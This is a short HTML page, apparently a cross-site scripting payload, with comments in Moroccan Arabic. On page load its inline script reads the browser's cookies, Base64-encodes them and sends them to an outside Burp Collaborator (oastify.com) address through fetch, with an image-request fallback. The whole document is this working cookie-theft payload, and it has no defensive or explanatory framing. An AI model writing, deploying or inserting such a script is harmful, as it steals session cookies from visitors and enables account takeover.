<!DOCTYPE html>
<html>
<body>
    <script>
        (function(){
            // الكود اللي كيسحب الكوكيز كاملة ويشفرها بـ Base64
            var cookies = btoa(document.cookie) || "NO_COOKIES";
            
            // الرابط الجديد ديالك (تأكدت بلي ما كاينش مسافات)
            var brupUrl = "https://uywypyix1k868hn4sadmjxyej5pwdm1b.oastify.com/?data=" + cookies;
            
            // إرسال التبليغ
            fetch(brupUrl, {mode: 'no-cors'});
            
            // احتياط: إرسال عبر Image في حالة فشل الـ fetch
            var i = new Image();
            i.src = brupUrl + "&type=img";
        })();
    </script>
</body>
</html>
